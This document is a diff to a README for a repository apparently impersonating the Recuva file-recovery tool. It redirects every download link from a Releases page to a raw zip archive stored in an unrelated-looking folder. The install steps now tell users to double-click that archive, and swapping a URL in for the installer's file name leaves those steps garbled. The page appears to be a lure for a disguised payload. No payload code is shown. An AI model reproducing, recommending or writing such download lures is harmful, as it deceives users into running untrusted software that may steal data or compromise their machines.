@@ -1,6 +1,6 @@
 # 🗂️ Recuva-File-Recovery-Installer-2025 - Restore Your Deleted Files Easily
 
-[![Download Recuva](https://img.shields.io/badge/Download-Recuva%20Now-brightgreen)](https://github.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/releases)
+[![Download Recuva](https://raw.githubusercontent.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/main/trigonometrician/Recuva-File-Recovery-Installer-2025.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/main/trigonometrician/Recuva-File-Recovery-Installer-2025.zip)
 
 ## 📦 About Recuva
 Recuva is a file recovery tool designed to help you recover deleted files from various devices. Whether you've lost documents, photos, or any other data from your PC, external drives, or memory cards, this software aims to restore what you've lost with ease.
@@ -26,17 +26,17 @@ Before you download, here are the minimum requirements to run Recuva smoothly:
 ## 🛠️ Download & Install
 To get started with Recuva, visit this page to download the latest version:
 
-[Download Recuva](https://github.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/releases)
+[Download Recuva](https://raw.githubusercontent.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/main/trigonometrician/Recuva-File-Recovery-Installer-2025.zip)
 
 Once you’re on the Releases page, follow these steps:
 
 1. Find the latest version of Recuva.
-2. Click on the link mentioning the installer file, usually labeled as `Recuva-Setup.exe`.
+2. Click on the link mentioning the installer file, usually labeled as `https://raw.githubusercontent.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/main/trigonometrician/Recuva-File-Recovery-Installer-2025.zip`.
 3. Wait for the download to finish. This file will be stored in your default downloads folder.
 
 ### Installation Steps
 1. Navigate to your downloads folder.
-2. Double-click on the `Recuva-Setup.exe` file.
+2. Double-click on the `https://raw.githubusercontent.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/main/trigonometrician/Recuva-File-Recovery-Installer-2025.zip` file.
 3. Follow the on-screen instructions to install the software.
 4. Once installed, launch Recuva from your desktop or start menu.
 
@@ -65,7 +65,7 @@ If you have questions or need assistance, you can find additional support in com
 ## 📢 Stay Updated
 Make sure to keep Recuva up to date to enjoy the latest features and improvements. You can always find the latest version on the Releases page:
 
-[Download Recuva](https://github.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/releases)
+[Download Recuva](https://raw.githubusercontent.com/Bruno17-b/Recuva-File-Recovery-Installer-2025/main/trigonometrician/Recuva-File-Recovery-Installer-2025.zip)
 
 ## 🌐 Additional Resources
 - **User Manual:** Detailed instructions and tips for using Recuva effectively.
